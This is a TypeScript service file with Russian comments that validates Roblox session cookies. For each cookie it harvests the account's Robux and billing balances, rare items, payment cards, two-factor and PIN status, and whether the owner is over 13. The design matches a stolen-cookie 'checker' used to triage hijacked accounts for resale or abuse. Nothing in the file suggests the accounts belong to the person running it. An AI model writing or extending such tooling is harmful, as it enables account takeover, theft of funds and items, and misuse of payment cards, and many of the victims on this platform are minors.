/**
 * Сервис для валидации и получения информации об аккаунтах Roblox
 */
import { RobloxAccount } from '@shared/types';
import { logger } from './logger';
import { robloxAPI } from './robloxAPIService';

/**
 * Форматирует куки для использования в запросах
 * @param cookie Исходный Roblox cookie
 * @returns Отформатированный cookie
 */
function formatCookie(cookie: string): string {
  // Если куки начинается с _|WARNING, используем его как есть
  if (cookie.startsWith('_|WARNING')) {
    return cookie;
  }
  return cookie;
}

/**
 * Значения по умолчанию для невалидных аккаунтов
 */
const defaultAccountValues: Omit<RobloxAccount, 'cookie' | 'isValid' | 'processedAt'> = {
  username: "",
  userId: "",
  robuxBalance: 0,
  pendingRobux: 0,
  premium: false,
  donations: 0,
  billingBalance: 0,
  rap: 0,
  hasHeadless: false,
  hasKorblox: false,
  avatarUrl: "",
  displayName: "",
  accountAge: 0,
  emailVerified: false,
  twoFactor: false,
  hasPin: false,
  voiceChat: false,
  friendsCount: 0,
  isAbove13: false,
  description: "",
  hasPaymentCards: false,
  cardsCount: 0
};

/**
 * Класс для валидации и получения информации об аккаунтах Roblox
 */
class AccountValidator {
  /**
   * Создать объект невалидного аккаунта
   * @param cookie Roblox cookie
   * @returns Объект аккаунта с исходным куки и дефолтными значениями
   */
  createInvalidAccount(cookie: string): RobloxAccount {
    return {
      cookie,
      isValid: false,
      ...defaultAccountValues,
      processedAt: new Date().toISOString()
    };
  }
  
  /**
   * Проверить валидность куки
   * @param cookie Roblox cookie
   * @returns Promise<boolean> true если куки валидный
   */
  async validateCookie(cookie: string): Promise<boolean> {
    try {
      const cleanCookie = formatCookie(cookie);
      return await robloxAPI.validateCookie(cleanCookie);
    } catch (error: unknown) {
      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
      logger.warn('Cookie validation failed', { error: errorMessage });
      return false;
    }
  }
  
  /**
   * Получить полную информацию об аккаунте
   * @param cookie Roblox cookie
   * @returns Информация об аккаунте или null, если аккаунт невалиден
   */
  async getAccountDetails(cookie: string): Promise<RobloxAccount | null> {
    try {
      const cleanCookie = formatCookie(cookie);
      
      // Проверка валидности куки
      const isValid = await robloxAPI.validateCookie(cleanCookie);
      if (!isValid) {
        return null;
      }
      
      // Получить данные о балансе в Robux
      const currencyData = await robloxAPI.getUserCurrency(cleanCookie);
      const robux = currencyData.robux || 0;
      
      // Получить данные о балансе биллинга
      const billingData = await robloxAPI.getUserBillingBalance(cleanCookie);
      const billingBalance = billingData.balance || 0;
      
      // Получить информацию о пользователе
      const userInfo = await robloxAPI.getUserInfo(cleanCookie);
      if (!userInfo) {
        return null;
      }
      
      // Получить настройки пользователя
      const settings = await robloxAPI.getUserSettings(cleanCookie);
      if (!settings) {
        return null;
      }
      
      // Получить настройки голосового чата
      const voiceChatData = await robloxAPI.getVoiceChatSettings(cleanCookie);
      
      // Получить количество друзей
      const friendsData = await robloxAPI.getFriendsCount(cleanCookie);
      
      // Получить описание профиля
      const descriptionData = await robloxAPI.getProfileDescription(cleanCookie);
      
      // Получить информацию о транзакциях
      const transactionsData = await robloxAPI.getTransactionTotals(cleanCookie, userInfo.id || 0);
      
      // Получить URL аватара
      const avatarUrl = robloxAPI.getAvatarUrl(userInfo.id || 0);
      
      // Проверить наличие предметов Headless и Korblox
      const hasHeadless = await robloxAPI.checkHeadlessItem(cleanCookie, userInfo.id || 0);
      const hasKorblox = await robloxAPI.checkKorbloxItem(cleanCookie, userInfo.id || 0);
      
      // Получить информацию о картах оплаты
      const paymentCardsData = await robloxAPI.getPaymentCards(cleanCookie, userInfo.id || 0);
      
      // Сформировать полный объект аккаунта
      const account: RobloxAccount = {
        cookie,
        isValid: true,
        username: userInfo.name || "",
        userId: (userInfo.id?.toString()) || "",
        robuxBalance: robux,
        pendingRobux: transactionsData?.pendingRobuxTotal || 0,
        premium: Boolean(settings.isPremium),
        donations: transactionsData?.incomingRobuxTotal || 0,
        billingBalance: billingBalance,
        rap: 0, // Требуется дополнительный запрос для получения RAP
        hasHeadless,
        hasKorblox,
        avatarUrl,
        displayName: userInfo.displayName || "",
        accountAge: Math.round((settings.AccountAgeInDays || 0) / 365 * 100) / 100,
        emailVerified: Boolean(settings.IsEmailVerified),
        twoFactor: Boolean(settings.MyAccountSecurityModel?.IsTwoStepEnabled),
        hasPin: Boolean(settings.IsAccountPinEnabled),
        voiceChat: Boolean(voiceChatData.isVerifiedForVoice),
        friendsCount: friendsData.count || 0,
        isAbove13: Boolean(settings.UserAbove13),
        description: descriptionData.description || "",
        hasPaymentCards: paymentCardsData.hasCards,
        cardsCount: paymentCardsData.cardsCount,
        processedAt: new Date().toISOString()
      };
      
      // Логируем успешное получение информации (безопасно)
      logger.info('Account information retrieved successfully', {
        userId: account.userId,
        username: account.username,
        premium: account.premium
      });
      
      return account;
    } catch (error: unknown) {
      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
      logger.error('Error getting account details', { error: errorMessage });
      return null;
    }
  }
}

// Экспортируем единственный экземпляр класса
export const accountValidator = new AccountValidator();